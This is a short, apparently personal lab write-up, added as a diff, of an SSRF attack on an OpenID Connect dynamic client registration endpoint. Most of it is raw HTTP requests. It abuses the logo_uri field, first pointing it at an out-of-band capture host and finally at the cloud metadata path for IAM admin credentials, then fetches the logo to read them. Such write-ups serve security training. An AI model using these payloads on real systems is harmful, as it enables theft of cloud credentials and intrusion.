@@ -1,0 +1,64 @@
+analysist:  try attack open id
+first need to go to auth server
+https://oauth-0ae90097036f93b7c02d75e1028d0023.oauth-server.net/.well-known/openid-configuration
+
+
+try to regist 
+
+POST /reg HTTP/2
+Host: oauth-0ae90097036f93b7c02d75e1028d0023.oauth-server.net
+Content-Type: application/json
+Content-Length: 67
+
+{
+    "redirect_uris" : [
+        "https://example.com"
+    ]
+}
+
+=> success => try to embbed in our subdomain
+find out a way to embbed link
+find that when authorizing social media account they also fetch [get] logo uri 
+try to attack uri_logo => success
+
+POST /reg HTTP/2
+Host: oauth-0ae90097036f93b7c02d75e1028d0023.oauth-server.net
+Content-Type: application/json
+Content-Length: 134
+
+{
+    "redirect_uris" : [
+        "https://example.com"
+    ],
+"logo_uri": "https://s3wwzmk9x8h1b1tja86stcq1xs3lra.oastify.com"
+}
+
+our final payload:
+
+POST /reg HTTP/2
+Host: oauth-0ae90097036f93b7c02d75e1028d0023.oauth-server.net
+Content-Type: application/json
+Content-Length: 155
+
+{
+    "redirect_uris" : [
+        "https://example.com"
+    ],
+"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+}
+
+and get logo:
+
+GET /client/OBefGah6fXeHB7ZMCGBLu/logo HTTP/2
+Host: oauth-0ae90097036f93b7c02d75e1028d0023.oauth-server.net
+Cookie: _session=GECuQmfxr1hw8NXLsjR0T; _session.legacy=GECuQmfxr1hw8NXLsjR0T
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://oauth-0ae90097036f93b7c02d75e1028d0023.oauth-server.net/interaction/-otLkLN-zFhzf0aJCW8Fs
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
